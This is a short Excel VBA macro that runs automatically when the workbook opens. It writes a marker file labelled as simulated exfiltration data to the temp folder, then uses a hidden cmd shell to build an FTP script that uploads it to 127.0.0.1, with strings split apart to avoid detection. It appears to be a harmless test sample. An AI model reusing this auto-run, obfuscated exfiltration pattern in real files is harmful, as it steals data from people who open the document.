Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, logPath As String
    logPath = Environ("TEMP") & "\obli" & "vionx_lo" & "g.txt"
    f = FreeFile
    Open logPath For Output As #f
    Print #f, "marker" & "-ftp-lo" & "g: simula" & "ted ex" & "filtra" & "tion data"
    Close #f
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\obl" & "ivionx_ft" & "p.txt", 0
End Sub
